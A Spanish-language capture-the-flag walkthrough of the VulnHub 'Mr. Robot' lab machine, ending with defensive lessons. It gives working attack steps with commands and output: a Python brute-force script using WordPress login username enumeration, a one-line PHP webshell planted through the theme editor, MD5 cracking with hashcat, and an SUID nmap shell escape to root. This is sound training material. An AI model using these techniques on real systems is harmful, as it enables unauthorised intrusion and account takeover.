Mr. Robot es una máquina Easy de **VulnHub** (de mi laboratorio autohospedado del eJPTv2) con temática de la serie, y es un recorrido ordenado de WordPress a root en tres llaves. Un sitio **WordPress** filtra un oráculo de enumeración de usuarios en su formulario de login, así que una fuerza bruta en dos fases contra el propio diccionario `fsocity.dic` de la máquina recupera **`elliot:ER28-0652`**. Desde el panel de admin, el editor de temas convierte una plantilla `404.php` en una webshell (RCE como `daemon`); un MD5 crackeado en el home de `robot` da movimiento lateral a `robot`; y un **`nmap` SUID** con su antiguo modo interactivo cae directo a `root`. Tres flags por el camino.

## Reconocimiento y Enumeración

### Escaneo de Puertos

```bash
sudo arp-scan -I vboxnet1 --localnet      # → 192.168.57.7
sudo nmap -p- -sCV 192.168.57.7 -oN nmap
```

```bash
PORT    STATE  SERVICE  VERSION

80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd
```

SSH está cerrado, así que la única superficie es el servidor web en 80/443. El sitio muestra una intro con temática de Mr. Robot sin título — toca enumerar contenido.

### Enumeración Web y WordPress

`gobuster` deja obvio el stack — esto es **WordPress** (`wp-login`, `wp-admin`, `wp-content`, …), y marca un par de rutas no estándar:

```bash
gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://192.168.57.7/
# ... wp-login, wp-admin, wp-content ...
# robots   (Status: 200)
# license  (Status: 200)
```

`robots.txt` es la primera llave — nombra un fichero de flag y un diccionario:

```bash
curl http://192.168.57.7/robots
# User-agent: *
# fsocity.dic
# key-1-of-3.txt
```

```bash
curl http://192.168.57.7/key-1-of-3.txt      # REDACTED  (flag 1)
wget http://192.168.57.7/fsocity.dic         # un diccionario de 7 MB
```

**`fsocity.dic`** es un diccionario de ~7 MB que la máquina nos entrega a propósito — es la wordlist para el ataque al login. (Está lleno de duplicados, así que `sort -u fsocity.dic` acelera mucho la fuerza bruta.)

## Acceso Inicial — Webshell por el Editor de Temas de WordPress como `daemon`

### Fuerza bruta del login con un oráculo de usuario

El `wp-login.php` de WordPress es un **oráculo de enumeración**: para un usuario que no existe responde *"Invalid username"*, pero para uno real con contraseña incorrecta responde *"The password you entered for the username X is incorrect."*. Esa diferencia permite una fuerza bruta en dos fases — primero encontrar un usuario válido, luego crackear su contraseña — que es exactamente lo que hace mi script de Python:

```python
# Fase 1 — encontrar el usuario: parar cuando la respuesta NO sea "Invalid username"
data = {"log": user, "pwd": "x", "wp-submit": "Log In"}
if "Invalid username" not in requests.post(url, data=data).text:
    # usuario válido encontrado

# Fase 2 — crackear la contraseña con fsocity.dic: parar cuando
# desaparezca el mensaje "password ... is incorrect"
data = {"log": username, "pwd": password, "wp-submit": "Log In"}
if "The password you entered for the username" not in requests.post(url, data=data).text:
    # contraseña encontrada
```

```bash
python3 userEnum.py
# [+] Username: elliot
# [+] Password: elliot:ER28-0652
```

**`elliot:ER28-0652`** entra directamente en `wp-admin`.

### Editor de temas → webshell → RCE

Los administradores de WordPress pueden editar el PHP de los temas en el navegador (**Appearance → Editor**). Sobrescribo una plantilla sin uso — el `404.php` del tema Twenty Fifteen — con una webshell de una línea y le doy a *Update File*:

```php
<?php system($_GET['cmd']); ?>
```

Pedir esa plantilla con un parámetro `cmd` ejecuta comandos como el usuario web:

```bash
curl 'http://192.168.57.7/wp-content/themes/twentyfifteen/404.php?cmd=id'
# uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

Ejecución de código como **`daemon`**. Tras una reverse shell y el habitual tratamiento de la TTY, al siguiente usuario.

## Movimiento Lateral — `daemon` → `robot`

El directorio home de `robot` guarda la segunda llave y un fichero de contraseña. La llave en sí solo la puede leer `robot`, pero el hash de la contraseña es legible por todos:

```bash
daemon@linux:/home/robot$ ls -la
# -r-------- robot robot  key-2-of-3.txt      (no se puede leer como daemon)
# -rw-r--r-- robot robot  password.raw-md5
daemon@linux:/home/robot$ cat password.raw-md5
# robot:c3fcd3d76192e4007dfb496cca67e13b
```

El nombre del fichero lo dice todo — un **MD5 raw**. El modo 0 de hashcat lo crackea al instante contra rockyou:

```bash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
# c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
```

`su robot` con esa contraseña, y la segunda llave es legible:

```bash
daemon@linux:/$ su robot        # contraseña: abcdefghijklmnopqrstuvwxyz
robot@linux:~$ cat key-2-of-3.txt     # REDACTED  (flag 2)
```

## Escalada de Privilegios — `robot` → `root` (SUID `nmap`)

La búsqueda de SUID devuelve un binario revelador — `nmap` en una ubicación no estándar:

```bash
robot@linux:~$ find / -perm -4000 2>/dev/null
/usr/local/bin/nmap
```

Este es un **nmap antiquísimo (v3.81)** que todavía tiene el modo legacy **`--interactive`**, y con el bit SUID corre como root. El modo interactivo puede saltar a una shell con `!`, así que es una shell de root directa de [GTFOBins](https://gtfobins.github.io/gtfobins/nmap/):

```bash
robot@linux:~$ nmap --interactive
nmap> !/bin/bash -p
bash-4.3# whoami
root
bash-4.3# cat /root/key-3-of-3.txt     # REDACTED  (flag 3)
```

Root, y la llave final.

## Conclusiones Clave

- **WordPress te dice qué usuarios existen.** Las respuestas distintas del formulario de login para un usuario erróneo frente a una contraseña errónea son un oráculo de enumeración gratis — encuentra primero la cuenta real (`elliot`), y así solo fuerza-bruteas la contraseña de un usuario. Un mensaje genérico de *"credenciales inválidas"* habría cerrado esta puerta.
- **El propio diccionario de la máquina es la pista.** `fsocity.dic` se servía a propósito; reconocer un diccionario suministrado como la vía de ataque prevista (y deduplicarlo) es la mitad de la batalla en un login de CTF.
- **El editor de temas es RCE para un admin de WordPress.** Editar el PHP de un tema en `Appearance → Editor` es una funcionalidad integrada que escribe código ejecutable en el webroot — cualquier login de admin es, en la práctica, una shell. Desactiva la edición de ficheros (`DISALLOW_FILE_EDIT`) en sitios reales.
- **Los secretos legibles por todos anulan los permisos de ficheros.** `key-2` estaba bloqueada para `robot`, pero `password.raw-md5` a su lado no lo estaba — y un MD5 débil de `abcdefghijklmnopqrstuvwxyz` entregó la cuenta igualmente. Un fichero protegido no vale nada junto a una contraseña crackeable del mismo usuario.
- **SUID en `nmap` es una shell de root instantánea.** El antiguo modo interactivo (`!comando`) corriendo como root vía el bit SUID es GTFOBins de manual. Audita los binarios SUID (`find / -perm -4000`) — cualquier cosa que pueda lanzar una shell o ejecutar comandos nunca debería llevar el bit.
